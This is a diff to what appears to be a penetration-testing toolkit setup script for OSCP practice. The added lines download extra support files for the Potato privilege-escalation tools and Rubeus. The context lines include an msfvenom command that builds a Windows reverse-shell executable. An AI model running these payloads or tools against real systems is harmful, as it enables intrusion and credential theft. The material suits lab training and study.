@@ -74,8 +74,14 @@ wget https://raw.githubusercontent.com/adann0/py_upload/main/upload.ps1
 msfvenom -p windows/shell/reverse_tcp LHOST='tun0' LPORT=443 -f exe > met.exe
 
 wget https://github.com/adann0/oscp-tools/blob/main/bin/MSFRottenPotato.exe
+wget https://github.com/adann0/oscp-tools/blob/main/bin/MSFRottenPotato.lib
+wget https://github.com/adann0/oscp-tools/blob/main/bin/MSFRottenPotato.pdb
 wget https://github.com/adann0/oscp-tools/blob/main/bin/SharpEfsPotato.exe
+wget https://github.com/adann0/oscp-tools/blob/main/bin/SharpEfsPotato.exe.config
+wget https://github.com/adann0/oscp-tools/blob/main/bin/SharpEfsPotato.pdb
 wget https://github.com/adann0/oscp-tools/blob/main/bin/Rubeus.exe
+wget https://github.com/adann0/oscp-tools/blob/main/bin/Rubeus.exe.config
+wget https://github.com/adann0/oscp-tools/blob/main/bin/Rubeus.pdb
 
 rm -f *.zip *.gz
 
